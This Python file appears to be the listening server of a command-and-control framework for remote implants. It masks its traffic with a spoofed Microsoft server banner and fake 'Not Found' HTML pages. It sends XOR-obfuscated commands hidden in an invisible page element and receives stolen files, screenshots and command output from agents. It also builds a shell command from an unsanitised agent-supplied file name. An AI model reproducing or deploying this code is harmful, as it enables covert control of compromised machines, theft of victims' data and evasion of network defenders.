from http.server import BaseHTTPRequestHandler, HTTPServer
from socketserver import ThreadingMixIn # Asynchronous requests - https://www.bogotobogo.com/python/python_network_programming_socketserver_framework_for_network_servers_asynchronous_request_ThreadingMixIn_ForkingMixIn.php
from tasks import Console
from tasks import AgentConsole
import tasks
from tasks import send_command
from tasks import agent_iso_class
import encrypt
import base64
import os
import subprocess
import time
from datetime import datetime

class MultiThreading(ThreadingMixIn, HTTPServer):
    pass

class Server(BaseHTTPRequestHandler):

  BaseHTTPRequestHandler.server_version = "Microsoft-HTTPAPI/2.0"
  BaseHTTPRequestHandler.sys_version = ""
  
  def log_message(self, format, *args):
    return

  def do_HEAD(self):
    pass
  def do_POST(self):
       AgentFolder = './Agents/' + agent_iso_class.unique_agent_name
       agentResults = ""
       # https://blog.anvileight.com/posts/simple-python-http-server/
       content_length = int(self.headers['Content-Length'])
       content_type = 'text/html'
       #cookie_results = send_cmd
       # decode b'' - read the data after the equal sign
       post_body = self.rfile.read(content_length).decode()
       results = post_body[2:len(post_body) + 1].split('=', 1)[1]
       xorkey = 'j' * len(results)
       decrypted_results = encrypt.Encryption.xor_crypt_string(self, results, xorkey, False, True)
       data_results = decrypted_results[12:len(decrypted_results)]
       agent_name = decrypted_results[0:12]
       if self.path =='/jquery.js':
            print("Agent " + agent_name + " Arrived!\n")
       elif "DownloadingFileRand1me3" in data_results:
            os.chdir(os.path.dirname(__file__))
            if not os.path.exists(AgentFolder + '/Downloads'):
              os.makedirs(AgentFolder + '/Downloads')
            split_data = data_results.split(" ")
            tempFile = "ignoremeFile.txt"
            # https://stackoverflow.com/questions/22216076/unicodedecodeerror-utf8-codec-cant-decode-byte-0xa5-in-position-0-invalid-s
            fullPath = AgentFolder + '/Downloads/' + tempFile
            print(fullPath)
            orgFile = AgentFolder + '/Downloads/' + split_data[1]
            print(orgFile)
            try:
               with open(fullPath, 'w') as out_file:
                  out_file.write(split_data[2])
                  out_file.close()
                  Convertb64_to_orgFile = subprocess.Popen("cat "+ fullPath + " | base64 -d > "+ orgFile,stdin=subprocess.PIPE, shell=True)
                  #Convertb64_to_orgFile = subprocess.Popen("rm -f "+ fullPath,stdin=subprocess.PIPE, shell=True)
                  Convertb64_to_orgFile.communicate()
                  print("File " + split_data[1] + " Downloaded Successfully under " + orgFile)
            except:
              print("Failed to download the file!")
       elif "This1sScreenSh0t" in data_results:
         os.chdir(os.path.dirname(__file__))
         if not os.path.exists(AgentFolder + '/Screenshots'):
           os.makedirs(AgentFolder + '/Screenshots')
         split_data = data_results.split(" ")
         imgPath = AgentFolder + '/Screenshots/'
         try:
           with open(imgPath + agent_iso_class.unique_agent_name + str(datetime.now().strftime('-%d%m%Y-%H.%M.%S')) + '.png', 'wb') as out_image:
             out_image.write(base64.b64decode(split_data[1]))
             out_image.close()
             print("Screenshot save under " + imgPath)
         except:
           print("Screenshot failed")
       elif self.path == '/login.aspx':
            agentResults = decrypted_results[12:len(decrypted_results)]
            print(agentResults)
       self.send_response(200)
       self.send_header('Content-type', content_type)
       self.end_headers()
       response = "<html>\n<head>\n<title>Microsoft Ajax</title>\n</head>\n<body>\n<h1>Not Found</h1>The requested URL /jquery.js was not found on this server.<hr/>\n<i>Apache/2.4.25 (NetWare) Server at localhost Port 80 </i>\n<br/><pre style='visibility:hidden;' id='wrapper'>\nMSAjax"'\n</pre>\n</body>\n</html>\n'
       self.wfile.write(bytes(response, 'UTF-8'))

  def do_GET(self):
      # read the URL path and the split the agent name after the ?
      spath = self.path
      split = spath[2:len(spath) + 1].split('?', 1)[1]
      xoragentkey = 'j' * len(split)
      decrypt_agentname = encrypt.Encryption.xor_crypt_string(self, split, xoragentkey, False, True)
      # https://pythonbasics.org/webserver/
      self.send_response(200)
      self.send_header("Content-type", "text/html")
      self.end_headers()
      xorkey = 'j' * len(send_command.send_cmd)
      encrypt_cmd = encrypt.Encryption.xor_crypt_string(self, send_command.send_cmd, xorkey, True, False)
      # statement to for agent isolation. Compare agent name from GET URL Path with the interact agentname
      if agent_iso_class.unique_agent_name == decrypt_agentname:
          response = "<html>\n<head>\n<title>Microsoft Ajax</title>\n</head>\n<body>\n<h1>Not Found</h1>The requested URL /jquery.js was not found on this server.<hr/>\n<i>Apache/2.4.25 (NetWare) Server at localhost Port 80 </i>\n<br/><pre style='visibility:hidden;' id='wrapper'>\nMSAjax" + encrypt_cmd + '\n</pre>\n</body>\n</html>\n'
          # Clean Previous Tasks
          send_command.send_cmd = "CleanTasks "
          self.wfile.write(bytes(response, 'UTF-8'))
      else:
          response = "<html>\n<head>\n<title>Microsoft Ajax</title>\n</head>\n<body>\n<h1>Not Found</h1>The requested URL /jquery.js was not found on this server.<hr/>\n<i>Apache/2.4.25 (NetWare) Server at localhost Port 80 </i>\n<br/><pre style='visibility:hidden;' id='wrapper'>\nMSAjax"'\n</pre>\n</body>\n</html>\n'
          self.wfile.write(bytes(response, 'UTF-8'))

  def handle_http(self):
    return
  def respond(self):
    return
